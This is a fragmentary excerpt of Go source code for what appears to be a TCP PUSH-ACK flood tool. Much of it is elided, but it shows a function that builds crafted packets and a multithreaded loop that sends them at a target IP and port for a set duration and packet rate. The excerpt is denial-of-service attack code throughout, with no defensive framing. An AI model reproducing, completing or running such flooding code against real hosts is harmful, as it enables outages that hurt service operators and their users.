...
func buildPushAck(srcIP, dstIP net.IP, dstPort uint16, localRand *rand.Rand) []byte {
...
func startPushAckFlood(ctx context.Context, opts ContextOpts, targetIP string, targetPort int, threads int, duration time.Duration, pps int) {
	fmt.Printf("[!] Starting PUSH-ACK Flood on %s:%d for %v with %d threads (PPS: %d)\n", targetIP, targetPort, duration, threads, pps)
	...
	for i := 0; i < threads; i++ {
		...
		go func(threadID int) {
			defer func() { if r := recover(); r != nil { LogErr("SYS", "Panic in PUSH-ACK flood: %v", r) } }()
			defer wg.Done()
			...
			for {
				...
				default:
					...
					packet := buildPushAck(srcIP, dstIP, uint16(targetPort), localRand)
	...
	fmt.Printf("[OK] PUSH-ACK Flood finished\n")
}
